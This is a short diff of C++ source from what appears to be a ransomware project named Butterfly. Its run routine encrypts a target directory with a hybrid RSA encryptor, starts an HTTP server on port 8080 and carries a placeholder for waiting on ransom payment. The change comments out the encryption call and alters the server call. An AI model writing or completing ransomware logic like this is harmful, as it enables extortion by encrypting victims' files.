@@ -98,13 +98,14 @@ void Butterfly::run()
     if ( !_args.dir.empty() )
     {
         std::cout << "Start Encryption+Decryption from directory " << _args.dir << std::endl;
+        /*
         // Start encryption
         std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(butterfly::params::RSA_KEYSIZE));
         encryptor->invokeDir(_args.dir, _args.protection);
-
+        */
         // After encryption start http server, gui or wallpaper
         std::shared_ptr<butterfly::HTTPServer> server = std::make_shared<butterfly::HTTPServer>(8080);
-        server->run(); //TODO: Create thread for HTTPServer
+        server->run(false);
 
         // Wait for ransom payment
         //TODO: Wait for ransom payment
